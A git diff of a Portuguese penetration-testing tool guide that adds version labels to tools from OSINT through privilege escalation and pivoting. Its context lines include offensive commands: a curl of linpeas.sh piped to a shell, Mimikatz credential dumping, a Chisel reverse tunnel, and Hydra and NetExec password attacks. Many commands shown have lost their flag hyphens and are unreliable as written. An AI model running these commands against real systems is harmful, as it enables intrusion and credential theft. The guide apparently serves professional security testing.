@@ -4,11 +4,13 @@ Este documento constitui um referencial técnico e acadêmico para a exploraçã
 
 Fundamentado em metodologias padrão da indústria, como o *Penetration Testing Execution Standard* (PTES) e a *Cyber Kill Chain*, este guia categoriza as aplicações em conformidade com o ciclo de vida do *pentest* — evoluindo do mapeamento inicial da superfície de ataque (OSINT) até a automação contínua de segurança em *pipelines* CI/CD. O escopo prioriza estritamente a precisão técnica, detalhando a operação de baixo nível, a sintaxe fundamentada e a execução prática de cada ferramenta em cenários éticos e profissionais.
 
+**Nota sobre versionamento:** ao lado do nome de cada ferramenta é indicada a versão estável mais recente identificada em julho de 2026. Essa referência serve como baseline para identificar eventuais mudanças de sintaxe, *flags* descontinuadas ou funcionalidades ausentes em instalações mais antigas. Como diversos projetos possuem ciclos de lançamento contínuos (*rolling release*), recomenda-se sempre confirmar a versão instalada localmente (geralmente via `--version`, `-v` ou `-h`) antes de aplicar os comandos deste documento.
+
 # **1  Reconhecimento Passivo e OSINT:**
 
 Coleta de informações em fontes abertas e inteligência de ameaças sem interação direta com a infraestrutura do alvo.
 
-## **1.1 TheHarvester**
+## **1.1 TheHarvester — v4.11.1**
 
 - **Descrição Acadêmica/Técnica:** O theHarvester é um *script* desenvolvido em Python projetado para a automação da coleta de dados de inteligência em fontes abertas. Operando em nível de aplicação (Camada 7 do modelo OSI), ele realiza requisições iterativas a motores de busca públicos, servidores de chaves PGP e APIs de terceiros (como Shodan, Hunter.io, e DNSdumpster) para compilar metadados associados a um domínio alvo. A arquitetura da ferramenta minimiza o tráfego de rede direto contra a infraestrutura do alvo, caracterizando-se primariamente como uma técnica de reconhecimento passivo, mitigando a probabilidade de detecção por sistemas de prevenção de intrusão (IPS).  
 - **Principais Funcionalidades:**  
@@ -36,7 +38,7 @@ theHarvester d alvo.com b all l 500 f reconalvoinicial
 
 
 
-## **1.2 Recon-ng**
+## **1.2 Recon-ng — v4.6.3**
 
 - **Descrição Acadêmica/Técnica:** O recon-ng é um framework de reconhecimento web completo, desenvolvido em Python, que adota uma arquitetura modular análoga ao Metasploit. Diferente de scripts isolados, ele utiliza uma base de dados SQLite estruturada para armazenar hosts, contatos, localizações e vulnerabilidades, permitindo a correlação de dados entre diferentes módulos. O sistema opera através de uma interface de linha de comando (CLI) que gerencia workspaces, garantindo a segregação de dados entre diferentes projetos de auditoria. Sua extensibilidade via APIs de terceiros permite a automação de consultas complexas e o processamento de grandes volumes de dados de inteligência sem interação direta com o alvo.  
 - **Principais Funcionalidades:**  
@@ -98,7 +100,7 @@ show hosts
 
 
 
-## **1.3 OWASP Amass**
+## **1.3 OWASP Amass — v5.1.1**
 
 - **Descrição Acadêmica/Técnica:** O OWASP Amass é uma ferramenta desenvolvida em linguagem Go, arquitetada para o mapeamento profundo da superfície de ataque e descoberta de ativos em redes externas. Diferente de *scripts* de enumeração simples, o Amass estrutura os dados coletados utilizando um banco de dados de grafos, o que permite a análise relacional entre domínios, endereços IP e provedores de hospedagem. Em baixo nível, a ferramenta implementa técnicas heurísticas, incluindo consultas a dezenas de APIs de *Threat Intelligence*, *scraping* de mecanismos de busca, análise de *Certificate Transparency* (CT Logs), resolução recursiva de DNS, detecção de *wildcards* e permutações de nomes para inferir a existência de infraestruturas não documentadas.  
 - **Principais Funcionalidades:**  
@@ -133,7 +135,7 @@ amass enum active d alvo.com brute ip dir ./reconamassalvo
 
 
 
-## **1.4 Maltego**
+## **1.4 Maltego — v4.12.1**
 
 - **Descrição Acadêmica/Técnica:** O Maltego é uma plataforma de mineração de dados e análise de vínculos (*link analysis*), desenvolvida em Java, com arquitetura primariamente orientada a uma interface gráfica de grafos relacionais. Sua operação ocorre por meio de entidades (nós) que são submetidas a "transformações" (*transforms*). Em baixo nível, um *transform* é um código (frequentemente em Python) executado localmente ou em servidores de terceiros (TAS  *Transform Application Server*), encarregado de realizar consultas estruturadas via APIs a bases de dados públicas e privadas (ex: registros WHOIS, Shodan, redes sociais e inteligência de ameaças). O retorno de dados em formato XML é instantaneamente renderizado em um grafo direcionado, permitindo ao analista correlacionar dezenas de milhares de artefatos de infraestrutura de TI, e identificar interdependências ocultas durante a modelagem de ameaças.
 - **Principais Funcionalidades:**  
@@ -163,7 +165,7 @@ python3 project.py local nomedotransform valordaentidade
 
 
 
-## **1.5 SpiderFoot**
+## **1.5 SpiderFoot — v4.0**
 
 - **Descrição Acadêmica/Técnica:** O SpiderFoot é uma ferramenta de automação de inteligência de fontes abertas (OSINT) desenvolvida em Python, projetada para integrar e correlacionar dados de mais de 200 fontes distintas. Sua arquitetura é orientada a eventos e baseada em módulos: cada dado coletado (ex: um endereço IP) é tratado como um evento que pode disparar automaticamente outros módulos (ex: geolocalização ou verificação de *reputation*). Em baixo nível, a ferramenta gerencia requisições assíncronas para APIs de terceiros e realiza *web scraping* para compilar um grafo de informações sobre domínios, sub-redes, e-mails e nomes de usuário, minimizando o esforço manual de correlação de dados brutos.  
 - **Principais Funcionalidades:**  
@@ -197,7 +199,7 @@ spiderfoot s alvo.com m s3bucket,whois,googlemaps o csv  resultadosrecon.csv
 
 Diferente do reconhecimento passivo, esta fase exige interação direta com a infraestrutura do alvo. O objetivo é enviar pacotes de rede forjados e analisar as respostas para mapear a topologia, identificar *hosts* vivos, determinar o estado de portas (abertas, fechadas, filtradas por *firewalls*) e realizar o *fingerprinting* de serviços e sistemas operacionais.
 
-## **2.1 Nmap (Network Mapper)**
+## **2.1 Nmap (Network Mapper) — v7.99**
 
 - **Descrição Acadêmica/Técnica:** Nmap é um utilitário de código aberto para exploração de rede e auditoria de segurança. Em baixo nível, opera manipulando *sockets* brutos (*Raw Sockets*) para forjar pacotes customizados nas camadas 3 (Rede) e 4 (Transporte) do modelo OSI. Através da análise determinística e probabilística dos pacotes de resposta (como *flags* TCP SYN/ACK/RST, mensagens ICMP e peculiaridades do *Initial Sequence Number*  ISN), a ferramenta infere o estado das portas e a identidade do *stack* TCP/IP do alvo. Além do mapeamento, o Nmap integra um motor de execução (NSE  *Nmap Scripting Engine*) baseado na linguagem Lua, expandindo sua capacidade para auditoria automatizada e detecção de vulnerabilidades (*CVEs*).  
 - **Principais Funcionalidades:**  
@@ -236,7 +238,7 @@ sudo nmap sS p- sV O -min-rate 1000 10.0.5.0/24 oA reconinternavlan5
 
 
 
-## **2.2 Masscan**
+## **2.2 Masscan — v1.3.2**
 
 - **Descrição Acadêmica/Técnica:** O Masscan é um *scanner* de portas TCP/UDP assíncrono arquitetado para varreduras de escopo global (ex: mapeamento de todo o espaço de endereçamento IPv4). Diferente do Nmap, que interage com a pilha TCP/IP do *kernel* do sistema operacional e aloca recursos para gerenciar o estado de cada conexão, o Masscan implementa sua própria micro-pilha TCP/IP em espaço de usuário (*user-space*). Operando de forma estritamente assíncrona via *raw sockets* (e suportando *drivers* de captura otimizados como o PFRING), ele separa as *threads* de transmissão e recepção. Isso permite o envio ininterrupto de pacotes SYN e o processamento reativo de respostas SYN/ACK de forma independente, atingindo taxas teóricas de até 10 milhões de pacotes por segundo.  
 - **Principais Funcionalidades:**  
@@ -267,7 +269,7 @@ sudo masscan p22,3389 203.0.113.0/16 -rate=50000 oG reconmassivoadmin.grep
 
 
 
-## **2.3 Netdiscover**
+## **2.3 Netdiscover — v0.21**
 
 - **Descrição Acadêmica/Técnica:** Operando exclusivamente na Camada 2 (Enlace de Dados) do modelo OSI, o Netdiscover é uma ferramenta projetada para a identificação de *hosts* vivos em redes locais (LANs) utilizando o protocolo ARP (*Address Resolution Protocol*). Diferente de varredores tradicionais que operam nas camadas 3 e 4 via ICMP ou TCP/UDP, o Netdiscover não depende de roteamento. Ele identifica ativos injetando requisições ARP no domínio de *broadcast* (modo ativo) ou interceptando tráfego ARP preexistente (modo passivo). Como o tráfego ARP é fundamental para a comunicação em rede local e raramente filtrado por *firewalls* de *host* (como o Windows Defender Firewall), o Netdiscover é altamente eficaz para mapear ativos antes da execução de varreduras de portas em camadas superiores.  
 - **Principais Funcionalidades:**  
@@ -300,7 +302,7 @@ sudo netdiscover p i eth0
 
 
 
-## **2.4 Legion**
+## **2.4 Legion — v0.7.0**
 
 - **Descrição Acadêmica/Técnica:** O Legion é um *framework* de *penetration testing* semi-automatizado, com interface gráfica desenvolvida em Python (via PyQt), que atua como um orquestrador para diversas ferramentas subjacentes de varredura e exploração (como Nmap, Masscan, Nikto, Dirb, Enum4linux e Hydra). Sua arquitetura baseia-se em execução sensível ao contexto (*context-aware automation*): ao identificar um serviço específico em uma porta (ex: HTTP na porta 80), o *framework* dinamicamente sugere e automatiza a execução de *scripts* e varreduras direcionadas exclusivamente àquele protocolo. Em baixo nível, ele abstrai a sintaxe complexa de múltiplos utilitários de linha de comando, estruturando os retornos padrão (*stdout/stderr*) em um banco de dados relacional local (SQLite) para centralização de evidências e gerenciamento de estado do projeto.  
 - **Principais Funcionalidades:**  
@@ -326,7 +328,7 @@ sudo legion
 
 Nesta fase do ciclo de auditoria, o foco transita do mapeamento topológico para a identificação ativa e triagem de falhas de segurança. O objetivo é correlacionar os serviços e versões descobertos na fase anterior com bancos de dados de vulnerabilidades conhecidas (CVEs), além de auditar configurações sistêmicas (misconfigurations) e credenciais padrão.
 
-## **3.1 Nuclei**
+## **3.1 Nuclei — v3.11.0**
 
 - **Descrição Acadêmica/Técnica:** Desenvolvido em linguagem Go pela ProjectDiscovery, o Nuclei é um motor de varredura de vulnerabilidades arquitetado sobre um modelo de execução declarativo baseado em *templates* YAML. Diferente de *scanners* tradicionais que operam primariamente via *banner grabbing* ou heurísticas fechadas, o Nuclei executa requisições HTTP, TCP, DNS e SSL exatas e customizadas, analisando as respostas contra padrões de expressões regulares (RegEx) ou *matchers* lógicos definidos pela comunidade. Essa abordagem de baixo nível (enviando o *payload* exato da exploração) reduz drasticamente a taxa de falsos positivos. Devido à sua altíssima concorrência e capacidade de saída em formatos estruturados (JSON), é amplamente adotado em *pipelines* de Integração e Entrega Contínuas (CI/CD) para testes de regressão de segurança.  
 - **Principais Funcionalidades:**  
@@ -364,7 +366,7 @@ nuclei u [https://staging.alvo.com](https://staging.alvo.com) tags config,cve se
 
 
 
-## **3.2 Nessus**
+## **3.2 Nessus — v10.12.1**
 
 - **Descrição Acadêmica/Técnica:** O Nessus, desenvolvido pela Tenable, é uma solução proprietária de varredura de vulnerabilidades amplamente consolidada como padrão na indústria corporativa. Em baixo nível, opera de forma arquiteturalmente análoga ao OpenVAS (que derivou de seu código *open-source* original), utilizando um motor que executa dezenas de milhares de *plugins* compilados, escritos na linguagem NASL (*Nessus Attack Scripting Language*). Sua distinção técnica principal reside na curadoria estrita e na telemetria global de suas assinaturas, o que lhe confere um índice de falsos positivos significativamente menor que as alternativas gratuitas. A ferramenta é projetada não apenas para inferência probabilística de CVEs via rede, mas fundamentalmente para a auditoria determinística do estado interno do sistema operacional.  
 - **Principais Funcionalidades:**  
@@ -394,7 +396,7 @@ sudo /opt/nessus/sbin/nessuscli update
 
 
 
-## **3.3 OpenVAS (Greenbone Vulnerability Management)**
+## **3.3 OpenVAS (Greenbone Vulnerability Management) — GVM v26.34**
 
 - **Descrição Acadêmica/Técnica:** O OpenVAS (*Open Vulnerability Assessment System*) é um *framework* corporativo de código aberto destinado ao gerenciamento centralizado de vulnerabilidades. Em baixo nível, não consiste em um executável isolado, mas sim em uma arquitetura baseada em múltiplos serviços: um processo gerenciador (gvmd), um servidor web para a interface de usuário (gsad) e o motor de varredura subjacente (ospd-openvas). O motor processa rotinas de testes denominadas *Network Vulnerability Tests* (NVTs), que são rotinas específicas desenvolvidas na linguagem NASL (*Nessus Attack Scripting Language*). Diferentemente de *scanners* que realizam apenas *banner grabbing* (inferência passiva), o OpenVAS atua de forma determinística por meio de varreduras autenticadas. Ele interage com o sistema de arquivos local do alvo via protocolos de administração (SMB, SSH, WMI) para auditar diretamente chaves de registro, permissões de diretórios e níveis de *patching* do *kernel*.  
 - **Principais Funcionalidades:**  
@@ -424,7 +426,7 @@ sudo gvm-check-setup
 
 
 
-## **3.4 Nikto**
+## **3.4 Nikto — v2.6.0**
 
 - **Descrição Acadêmica/Técnica:** Desenvolvido em linguagem Perl e fundamentado na biblioteca de rede *LibWhisker*, o Nikto é um *scanner* de código aberto projetado estritamente para a auditoria infraestrutural de servidores HTTP/HTTPS (Camada 7 do modelo OSI). Diferente de ferramentas dinâmicas de análise de aplicação (DAST) que testam o código-fonte da aplicação (buscando falhas de lógica, SQLi ou XSS), o Nikto foca na configuração do *host*. Em baixo nível, ele envia milhares de requisições sequenciais predefinidas, avaliando as respostas do servidor (códigos HTTP, variação no tamanho da resposta e *banners*) contra um banco de dados interno de mais de 6.700 arquivos potencialmente perigosos (ex: install.php, web.config.bak), diretórios padrão ocultos, *scripts* CGI vulneráveis e ausência de cabeçalhos de segurança essenciais (*Security Headers*). Por seu volume massivo e direto de requisições, é uma ferramenta ruidosa, projetada para identificar rapidamente *low-hanging fruits* (falhas de configuração triviais).  
 - **Principais Funcionalidades:**  
@@ -467,7 +469,7 @@ nikto h [http://10.0.30.15](http://10.0.30.15) Tuning 1,2,3,4 Format txt o relat
 
 Diferente das fases anteriores, voltadas à infraestrutura e rede, esta seção opera exclusivamente na Camada 7 do modelo OSI. O objetivo tático é a análise dinâmica (DAST) e a exploração lógica da aplicação para identificar vulnerabilidades inerentes ao código (como mapeadas pelo *OWASP Top 10*), incluindo injeções (SQLi, XSS), falhas de controle de acesso, SSRF e quebras de autenticação. 
 
-## **4.1 Burp Suite**
+## **4.1 Burp Suite — v2026.7**
 
 - **Descrição Acadêmica/Técnica:** Desenvolvido pela PortSwigger em Java, o Burp Suite é uma plataforma integrada para testes de segurança em aplicações web, arquitetada em torno de um *proxy* de interceptação *man-in-the-middle* (MITM) que se posiciona entre o navegador do analista e o servidor alvo. Em baixo nível, ele termina a sessão TLS do cliente e estabelece uma nova conexão criptografada com o destino, utilizando um certificado raiz próprio (CA *self-signed*) instalado no navegador para descriptografar e permitir a manipulação em tempo real de requisições e respostas HTTP/HTTPS antes da retransmissão. Sobre essa camada de interceptação, a suíte agrega múltiplos módulos especializados (Repeater, Intruder, Scanner, Sequencer, Decoder), permitindo desde a manipulação manual granular de parâmetros até a automação de ataques de força bruta e a varredura ativa/passiva de vulnerabilidades lógicas.  
 - **Principais Funcionalidades:**  
@@ -494,7 +496,7 @@ java jar caminhoburpsuitepro.jar -project-file=projeto.burp -config-file=config.
 
 
 
-## **4.2 OWASP ZAP (Zed Attack Proxy)**
+## **4.2 OWASP ZAP (Zed Attack Proxy) — v2.17.0**
 
 - **Descrição Acadêmica/Técnica:** O OWASP ZAP é um *proxy* de interceptação e *scanner* de vulnerabilidades de código aberto, desenvolvido em Java sob a governança da fundação OWASP, arquitetado como alternativa livre e totalmente automatizável ao Burp Suite. Em baixo nível, sua operação central também se baseia em um *proxy* MITM com certificado raiz próprio, porém sua arquitetura é fundamentalmente orientada à automação: o ZAP expõe uma API REST completa e um motor de *scripting* (Zest, Python, JavaScript) que permite orquestrar rastreamentos (*spidering*), varreduras ativas e passivas inteiramente via linha de comando ou *pipelines* de CI/CD, sem dependência estrita da interface gráfica. O *Ajax Spider*, baseado no motor de navegação Selenium/HtmlUnit, complementa o rastreamento tradicional ao renderizar e interagir com aplicações que dependem intensamente de JavaScript (*Single Page Applications*).  
 - **Principais Funcionalidades:**  
@@ -533,7 +535,7 @@ zap.sh cmd quickurl [https://staging.alvo.com](https://staging.alvo.com) quickpr
 
 
 
-## **4.3 SQLmap**
+## **4.3 SQLmap — v1.10.6**
 
 - **Descrição Acadêmica/Técnica:** O SQLmap é uma ferramenta de exploração automatizada de injeção SQL (SQLi), desenvolvida em Python, projetada para detectar e explorar falhas de sanitização de entrada em camadas de persistência de dados. Em baixo nível, o motor opera através de um extenso conjunto de técnicas de inferência: *Boolean-based blind*, *Error-based*, *UNION query-based*, *Stacked queries* e *Time-based blind*, testando sistematicamente a resposta da aplicação a payloads booleanos e temporizados quando não há retorno direto de dados na tela. Uma vez confirmado o vetor de injeção, a ferramenta é capaz de impressão digital do SGBD (*fingerprinting* via banners e comportamento de funções nativas), enumeração de metadados (bancos, tabelas, colunas) através de consultas SQL cegas reconstruídas byte a byte, e, dependendo dos privilégios do usuário do banco, escalonamento para execução de comandos no sistema operacional subjacente via funcionalidades nativas do SGBD (ex: xpcmdshell no MSSQL).  
 - **Principais Funcionalidades:**  
@@ -576,7 +578,7 @@ sqlmap u "[http://alvo.com/noticia.php?id=15](http://alvo.com/noticia.php?id=15)
 
 
 
-## **4.4 ffuf (Fuzz Faster U Fool)**
+## **4.4 ffuf (Fuzz Faster U Fool) — v2.2.1**
 
 - **Descrição Acadêmica/Técnica:** O ffuf é uma ferramenta de *fuzzing* web de alto desempenho, escrita em linguagem Go, projetada para a descoberta de conteúdo e a manipulação sistemática de qualquer ponto de uma requisição HTTP através da substituição de uma palavra-chave (FUZZ) por entradas provenientes de uma *wordlist*. Em baixo nível, sua arquitetura aproveita a concorrência nativa do Go (*goroutines*) para disparar um volume massivo de requisições HTTP simultâneas, avaliando as respostas com base em filtros granulares de código de status, tamanho de resposta, contagem de palavras/linhas ou tempo de resposta, permitindo isolar resultados relevantes mesmo em aplicações que retornam página 200 genérica para recursos inexistentes (*soft 404s*). Sua flexibilidade de posicionamento do marcador FUZZ permite aplicá-lo não apenas a diretórios de URL, mas também a parâmetros, *headers*, valores de *cookies* e sub-domínios (*virtual host fuzzing*).  
 - **Principais Funcionalidades:**  
@@ -619,7 +621,7 @@ ffuf w /usr/share/wordlists/dirb/common.txt u [http://alvo.com/FUZZ](http://alvo
 
 Esta fase representa o ponto de transição entre a identificação teórica de falhas e a obtenção prática de acesso não autorizado. O objetivo é operacionalizar as vulnerabilidades mapeadas nas fases anteriores através da execução de *exploits*, ataques de injeção e tentativas de autenticação, culminando no comprometimento inicial (*Initial Access*) de um serviço, host ou banco de dados.
 
-## **5.1 Metasploit Framework**
+## **5.1 Metasploit Framework — v6.4.145**
 
 - **Descrição Acadêmica/Técnica:** O Metasploit Framework, mantido pela Rapid7 e desenvolvido primariamente em Ruby, é a plataforma de exploração modular mais consolidada da indústria, estruturando o ciclo completo de um ataque em componentes reutilizáveis e interoperáveis. Em baixo nível, sua arquitetura é dividida em módulos de *exploits* (código que abusa de uma vulnerabilidade específica), *payloads* (a carga útil executada após o sucesso, ex: *reverse shells*), *encoders* (ofuscação de *payloads* para evasão de antivírus/IDS) e *auxiliary* (varreduras e utilitários que não necessariamente concedem acesso). O componente central de pós-exploração, o Meterpreter, é um *payload* avançado que opera inteiramente em memória (*in-memory*, sem tocar o disco), comunicando-se com o atacante através de um canal criptografado e extensível dinamicamente via carregamento de novas funcionalidades (*stagers* e *stages*) sem a necessidade de reconexão.  
 - **Principais Funcionalidades:**  
@@ -676,7 +678,7 @@ exploit
 
 
 
-## **5.2 SearchSploit**
+## **5.2 SearchSploit — exploitdb 2026-06-09**
 
 - **Descrição Acadêmica/Técnica:** O SearchSploit é a ferramenta de linha de comando oficial para consulta *offline* ao *Exploit Database* (Exploit-DB), desenvolvida em *shell script* e Python, mantida pela Offensive Security. Em baixo nível, ela opera sobre uma cópia local espelhada (via Git) de todo o repositório de *exploits*, *shellcodes* e artigos técnicos do Exploit-DB, eliminando a dependência de conectividade com a internet durante engajamentos em redes segmentadas ou *air-gapped*. As consultas são processadas através de um índice de metadados estruturado em CSV (filesexploits.csv), permitindo buscas rápidas por título, plataforma, tipo de vulnerabilidade ou identificador CVE, retornando o caminho exato do código-fonte do *exploit* correspondente no sistema de arquivos local para inspeção ou execução imediata.  
 - **Principais Funcionalidades:**  
@@ -716,7 +718,7 @@ searchsploit m unix/remote/36803.py
 
 
 
-## **5.3 Hydra**
+## **5.3 Hydra — v9.7**
 
 - **Descrição Acadêmica/Técnica:** O Hydra (THC-Hydra) é uma ferramenta de ataque de força bruta e dicionário *online*, escrita em C, projetada para testar credenciais de autenticação contra uma vasta gama de protocolos e serviços de rede em tempo real. Em baixo nível, sua arquitetura é fundamentada em *módulos de protocolo* independentes e um núcleo altamente paralelizado baseado em *threads* (pthreads), que estabelece múltiplas conexões TCP/UDP simultâneas contra o serviço alvo, submetendo combinações de usuário/senha e analisando o código de retorno ou a mensagem de resposta do *daemon* (ex: "530 Login incorrect" via FTP, ou o código de status HTTP de um formulário web) para inferir o sucesso ou falha da tentativa. Diferente de ataques *offline* contra hashes, o Hydra interage diretamente com o serviço em produção, tornando-o suscetível a mecanismos de defesa como *rate limiting*, *account lockout* e detecção por IDS/IPS.  
 - **Principais Funcionalidades:**  
@@ -751,7 +753,7 @@ hydra L usuarioscorporativos.txt P /usr/share/wordlists/rockyou.txt t 4 f 10.0.5
 
 
 
-## **5.4 NetExec (NXC)**
+## **5.4 NetExec (NXC) — v1.5.1**
 
 - **Descrição Acadêmica/Técnica:** O NetExec, sucessor direto e mantido ativamente do descontinuado CrackMapExec (CME), é um *framework* de exploração e enumeração pós-comprometimento para ambientes *Active Directory*, desenvolvido em Python. Sua arquitetura é centrada na automação de tarefas administrativas em escala através dos protocolos SMB, WinRM, MSSQL, SSH e LDAP. Em baixo nível, a ferramenta implementa os protocolos de autenticação NTLM e Kerberos de forma nativa (sem depender de binários do sistema como o *smbclient*), permitindo a validação massiva e paralela de credenciais (senhas em texto claro, hashes NTLM ou tíquetes Kerberos) contra centenas de *hosts* simultaneamente. Sua extensibilidade modular embute funcionalidades avançadas de pós-exploração, como a extração remota do banco SAM/LSA, execução de comandos via WMI/SMBExec e coleta de dados para posterior análise de caminhos de ataque no BloodHound.  
 - **Principais Funcionalidades:**  
@@ -794,7 +796,7 @@ nxc smb 10.0.0.0/24 u joao.silva p 'Senha@2024' continue-on-success
 
 Uma vez estabelecido o acesso inicial, geralmente restrito a um usuário de baixo privilégio, esta fase concentra-se na enumeração exaustiva do sistema comprometido para identificar vetores de escalonamento (*misconfigurations*, falhas de *kernel*, credenciais em cache) e no *bypass* de mecanismos de controle de acesso, com o objetivo final de obter privilégios administrativos (root/SYSTEM) e mapear a estrutura de confiança do domínio.
 
-## **6.1 PEAS Suite (LinPEAS / WinPEAS)**
+## **6.1 PEAS Suite (LinPEAS / WinPEAS) — build 2026-07-01**
 
 - **Descrição Acadêmica/Técnica:** A PEAS Suite (*Privilege Escalation Awesome Scripts*) compreende dois *scripts* de enumeração massiva e automatizada — LinPEAS (Bash, para sistemas Unix-like) e WinPEAS (C/.NET, para sistemas Windows) — projetados para varrer sistematicamente o sistema operacional comprometido em busca de vetores de escalonamento de privilégios. Em baixo nível, os *scripts* não exploram vulnerabilidades diretamente; em vez disso, executam centenas de verificações determinísticas e heurísticas (leitura de permissões de arquivos SUID/SGID, análise de tarefas *cron*/*Scheduled Tasks*, enumeração de capacidades do *kernel*, busca por credenciais em arquivos de configuração e histórico de *shell*, verificação de *binários* com permissões de execução elevadas) e correlacionam os achados com bancos de dados conhecidos de técnicas de escalonamento (como o GTFOBins), destacando os resultados via codificação de cores baseada em probabilidade de exploração (vermelho para altíssima probabilidade).  
 - **Principais Funcionalidades:**  
@@ -833,7 +835,7 @@ curl s [http://10.0.5.100:8080/linpeas.sh](http://10.0.5.100:8080/linpeas.sh) | 
 
 
 
-## **6.2 Mimikatz**
+## **6.2 Mimikatz — v2.2.0**
 
 - **Descrição Acadêmica/Técnica:** O Mimikatz, desenvolvido em C por Benjamin Delpy, é uma ferramenta de extração de credenciais que opera através da manipulação direta da memória de processos do sistema Windows, especificamente do processo *Local Security Authority Subsystem Service* (LSASS). Em baixo nível, a ferramenta requer privilégios administrativos para abrir um *handle* de acesso ao processo LSASS (via chamadas à API do Windows como OpenProcess e ReadProcessMemory) e realiza a leitura e descriptografia estrutural das regiões de memória onde o sistema operacional armazena, em cache, as credenciais de sessões ativas — incluindo hashes NTLM, tíquetes Kerberos (TGT/TGS) e, em condições específicas (WDigest habilitado), senhas reversivelmente cifradas. Sua funcionalidade mais crítica, o *Pass-the-Hash* e o *Pass-the-Ticket*, permite reutilizar essas credenciais extraídas para autenticação lateral sem jamais conhecer a senha em texto claro do usuário.  
 - **Principais Funcionalidades:**  
@@ -878,7 +880,7 @@ sekurlsa::logonpasswords
 
 
 
-## **6.3 BloodHound**
+## **6.3 BloodHound — v9.4.0**
 
 - **Descrição Acadêmica/Técnica:** O BloodHound é uma ferramenta de análise de grafos para ambientes *Active Directory* e Azure AD, composta por um coletor de dados (*Ingestor*, tradicionalmente o SharpHound) e uma interface de visualização baseada no banco de dados orientado a grafos Neo4j. Em baixo nível, o coletor enumera exaustivamente o domínio através de consultas LDAP e chamadas de API do Windows (ex: enumeração de sessões via NetSessionEnum, permissões de ACLs via consultas ao *Security Descriptor* de objetos), mapeando relações de confiança complexas — como pertencimento a grupos, permissões delegadas, sessões de logon ativas e privilégios de acesso remoto — que são normalmente invisíveis a uma análise manual. A plataforma então aplica a teoria dos grafos para calcular algoritmicamente o *caminho de menor resistência* (*shortest path*) entre um usuário de baixo privilégio comprometido e o objetivo final (tipicamente, o grupo *Domain Admins*), revelando cadeias de ataque não intencionais decorrentes do acúmulo orgânico de permissões ao longo do tempo.  
 - **Principais Funcionalidades:**  
@@ -917,7 +919,7 @@ bloodhound-python u usuario p senha d dominio.local ns IPdoDC c All
 
 Com privilégios elevados estabelecidos em um ponto de apoio (*foothold*), esta fase concentra-se em expandir o alcance do comprometimento através de segmentos de rede internos inacessíveis diretamente, bem como em garantir mecanismos de acesso remoto duradouros. O foco técnico recai sobre o tunelamento de tráfego, o roteamento de ferramentas ofensivas através de hosts pivô e o estabelecimento de canais de acesso persistentes.
 
-## **7.1 Chisel**
+## **7.1 Chisel — v1.11.8**
 
 - **Descrição Acadêmica/Técnica:** O Chisel é uma ferramenta de tunelamento TCP/UDP rápida, desenvolvida em Go e compilada como um binário estático único (sem dependências externas), projetada para estabelecer túneis criptografados sobre HTTP/WebSocket entre um cliente e um servidor. Em baixo nível, a ferramenta opera em uma arquitetura cliente-servidor: uma instância atua como servidor (tipicamente na máquina do atacante, expondo uma porta de escuta), enquanto a outra atua como cliente (executada no *host* pivô comprometido), estabelecendo uma conexão *outbound* multiplexada sobre uma única sessão SSH encapsulada dentro de WebSocket. Essa característica é criticamente relevante em ambientes corporativos, pois o tráfego de tunelamento se assemelha a tráfego HTTP/HTTPS legítimo, contornando *firewalls* de saída (*egress filtering*) que tipicamente bloqueiam apenas portas não convencionais, ao mesmo tempo em que multiplexa múltiplos túneis lógicos (*forward* e *reverse*) sobre essa única conexão física.  
 - **Principais Funcionalidades:**  
@@ -954,7 +956,7 @@ chisel client 203.0.113.50:8000 R:socks
 
 
 
-## **7.2 Proxychains**
+## **7.2 Proxychains — v4.17 (proxychains-ng)**
 
 - **Descrição Acadêmica/Técnica:** O Proxychains é um utilitário que força o redirecionamento (*hijacking*) das chamadas de rede de qualquer aplicação para uma cadeia de *proxies* configurados (SOCKS4, SOCKS5 ou HTTP), sem exigir que a aplicação alvo possua suporte nativo a *proxy*. Em baixo nível, a ferramenta opera através da técnica de *interceptação dinâmica de biblioteca* (*LDPRELOAD* em sistemas Linux), injetando sua própria biblioteca compartilhada (libproxychains) antes da execução do programa. Essa biblioteca sobrescreve (*hook*) as chamadas de sistema padrão de rede (como connect()), redirecionando de forma transparente todo o tráfego TCP originalmente destinado a um socket direto através da cadeia de *proxies* definida no arquivo de configuração, permitindo o uso irrestrito de ferramentas como Nmap ou NetExec através de túneis previamente estabelecidos (ex: via Chisel ou SSH).  
 - **Principais Funcionalidades:**  
@@ -990,7 +992,7 @@ proxychains nxc smb 192.168.20.0/24 u joao.silva p 'Senha@2024'
 
 
 
-## **7.3 Evil-WinRM**
+## **7.3 Evil-WinRM — v3.9**
 
 - **Descrição Acadêmica/Técnica:** O Evil-WinRM é um cliente ofensivo em Ruby para o protocolo *Windows Remote Management* (WinRM), que implementa o padrão WS-Management sobre HTTP/HTTPS (portas 5985/5986) para estabelecer sessões de *shell* remota interativa e completa em sistemas Windows, análoga a uma sessão PowerShell legítima e nativa do sistema operacional alvo. Em baixo nível, a ferramenta autentica-se via NTLM ou Kerberos (com suporte nativo a *hashes* NTLM para *Pass-the-Hash*, eliminando a necessidade de senha em texto claro) e, uma vez estabelecida a sessão, opera como um cliente WinRM completo, permitindo não apenas a execução de comandos remotos, mas também a carga dinâmica de *scripts* e módulos PowerShell diretamente na memória do processo remoto (*in-memory loading*), evitando a gravação de artefatos maliciosos em disco e a consequente detecção por soluções de *antivírus* baseadas em assinatura de arquivo.  
 - **Principais Funcionalidades:**  
@@ -1035,7 +1037,7 @@ menu
 
 Ao longo das fases anteriores, diversos artefatos criptográficos são coletados (hashes NTLM extraídos via Mimikatz, arquivos de captura de handshakes Wi-Fi, hashes de banco de dados extraídos via SQLmap). Esta seção concentra-se na conversão desses artefatos ilegíveis em credenciais em texto claro, através de ataques computacionais offline (sem interação com o serviço original) e online (contra um serviço ativo), bem como na geração e mutação inteligente de listas de palavras candidatas.
 
-## **8.1 Hashcat**
+## **8.1 Hashcat — v7.1.2**
 
